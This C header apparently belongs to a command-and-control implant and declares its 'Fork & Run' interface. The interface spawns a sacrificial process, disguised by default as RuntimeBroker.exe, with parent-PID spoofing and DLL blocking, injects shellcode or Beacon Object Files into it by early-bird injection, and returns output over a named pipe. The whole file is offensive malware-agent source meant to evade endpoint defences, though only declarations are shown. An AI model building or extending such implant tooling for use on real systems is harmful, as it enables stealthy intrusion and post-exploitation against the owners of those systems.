/*
 * fork_run.h — Fork & Run: execute payloads in a sacrificial process.
 *
 * Instead of running BOFs/assemblies in the agent's own process (which
 * risks crashing the agent), Fork & Run spawns a sacrificial child,
 * injects the payload, captures output via a named pipe, and cleans up.
 *
 * The sacrificial process is created with:
 *   - PPID spoofing (configurable)
 *   - BlockDLLs (configurable)
 *   - CREATE_SUSPENDED
 *   - Redirected stdout/stderr to a pipe back to the agent
 */
#ifndef FORK_RUN_H
#define FORK_RUN_H

#include <windows.h>
#include "inject.h"

typedef struct _FORK_RUN_OPTS {
    const wchar_t *spawnTo;     /* Process to spawn. NULL = default */
    DWORD   ppidSpoof;          /* Parent PID to spoof. 0 = no spoof */
    BOOL    blockDlls;          /* Block non-MS DLLs in child */
    DWORD   timeoutMs;          /* Max execution time. 0 = 60000ms default */
    INJECT_TECHNIQUE technique; /* Injection method. Default = EARLY_BIRD */
} FORK_RUN_OPTS;

typedef struct _FORK_RUN_RESULT {
    BOOL    success;
    BYTE   *output;             /* Captured output (caller must free via fork_run_free) */
    DWORD   outputLen;
    DWORD   exitCode;           /* Child process exit code */
    char    errorMsg[256];
} FORK_RUN_RESULT;

/*
 * Execute a payload (shellcode) in a sacrificial process.
 * Captures stdout/stderr output from the child.
 *
 * Returns TRUE on success.
 * Caller must call fork_run_free(result) to release output buffer.
 */
BOOL fork_run_execute(
    const unsigned char *payload,
    SIZE_T payloadLen,
    FORK_RUN_OPTS *opts,
    FORK_RUN_RESULT *result
);

/*
 * Execute a BOF in a sacrificial process.
 * The agent generates a shellcode wrapper that:
 *   1. Loads the COFF
 *   2. Runs the entry point
 *   3. Writes output to the pipe
 *
 * This is a higher-level function built on fork_run_execute.
 * For now, it injects the raw BOF bytes and relies on a
 * shellcode stub (TODO: BOF-to-shellcode converter).
 */
BOOL fork_run_bof(
    const unsigned char *coffBytes,
    SIZE_T coffLen,
    const unsigned char *argBuffer,
    SIZE_T argLen,
    FORK_RUN_OPTS *opts,
    FORK_RUN_RESULT *result
);

/* Free output buffer allocated by fork_run_execute/fork_run_bof. */
void fork_run_free(FORK_RUN_RESULT *result);

/* Default spawn-to process */
#define FORK_RUN_DEFAULT_SPAWN L"C:\\Windows\\System32\\RuntimeBroker.exe"

#endif /* FORK_RUN_H */
